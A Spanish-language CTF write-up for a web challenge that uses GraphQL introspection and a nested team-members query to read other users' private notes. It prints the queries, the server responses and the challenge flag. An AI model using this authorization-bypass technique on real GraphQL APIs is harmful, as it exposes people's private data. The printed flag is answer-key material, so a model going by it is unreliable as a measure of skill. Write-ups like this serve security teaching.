# Writeup: La forma de la consulta (The Shape of a Query)

**CTF:** Pointer Overflow CTF 2026  
**Categoría:** Web  
**Dificultad:** Fácil / Media (97 pts)  

## 1. Descripción del reto

El portal plantea una plataforma de investigación colaborativa expuesta a pruebas de penetración. La consigna inicial advierte sobre la seguridad de los usuarios y el riesgo de que los investigadores accedan a información ajena, lo que anticipa fallas de control de acceso en las consultas.

* **URL del Portal:** `https://shape-of-query.pointeroverflowctf.com`
* **Token de sesión:** Proporcionado por la plataforma para autenticar la sesión de equipo.


## 2. Reconocimiento e Inspección Inicial

Al ingresar a la aplicación e iniciar sesión con el token asignado, la interfaz devolvió un mensaje de bienvenida junto con una consulta de prueba predeterminada:

```text
# Welcome to the portal.
# Introspection is enabled — start by exploring the schema.
{
  me {
    id
    username
    role
  }
}
```
Al ejecutarla, el servidor respondió con mi información de usuario:
```
{
  "data": {
    "me": {
      "id": "user_1287",
      "role": "MEMBER",
      "username": "researcher_1287"
    }
  }
}
```
## Análisis de la Tecnología
Backend: La estructura de las peticiones confirmó el uso de GraphQL.

Configuración Insegura: El mensaje del sistema indicó explícitamente que la Introspección estaba habilitada en producción. Esto permitió a cualquier usuario autenticado consultar los metadatos del servidor para mapear la totalidad del esquema (tipos, campos y funciones ocultas).

## 3. Exploración del Esquema
Aprovechando que la introspección se encontraba activa, envié una consulta de introspección (__schema) para extraer el plano completo de la API. Del análisis de los tipos devueltos, destaqué los componentes clave:

Objeto Query (Puntos de entrada):
me: Devuelve la cuenta actual.
user(id: ID): Permite buscar un usuario por su identificador (con la restricción teórica de ver solo al propio usuario).

Objeto User (Estructura de datos):
Contiene los campos id, username, role, team y un campo crítico: privateNotes ("Personal notes. Visible to the account owner only").

Objeto Team:
Contiene los campos id, name y members (miembros del equipo del llamador).

## 4. Explotación y Obtención de la Flag
Prueba inicial (PoC)
Para verificar el comportamiento del control de acceso, consulté mis propias notas privadas mediante el endpoint de usuario:
```
query {
  user(id: "user_1287") {
    id
    username
    privateNotes
  }
}
```
El servidor respondió correctamente con mis notas personales ("Grocery list, personal reminders..."), confirmando que el campo era accesible mediante la consulta de ID.

## Evaluación de IDOR y Enumeración de Miembros
Intenté consultar IDs adyacentes (user_1286, etc.) para evaluar vulnerabilidades de IDOR (Insecure Direct Object Reference), pero el servidor devolvía null para identificadores externos.

Dado que la enumeración directa de IDs estaba bloqueada o fuera de rango, revisé el esquema en busca de relaciones entre objetos. Noté que el tipo User vinculaba directamente a un Team, y este último exponía la lista de miembros mediante el campo members.

Modifiqué la estrategia y ejecuté una consulta anidadas a través de mi propio equipo para inspeccionar a los integrantes.
```
query {
  me {
    team {
      id
      name
      members {
        id
        username
        privateNotes
      }
    }
  }
}
```
Al ejecutar esta consulta, el backend omitió la restricción estricta de aislamiento entre los miembros del equipo en el campo de notas, devolviendo el contenido privado de los otros integrantes y revelando la bandera oculta.

Flag obtenida:POCTF{81.1287.WOYQ3KRL5PFXQ7OQ.MBYPIDW4C52W2F3NI23GAZOYF4}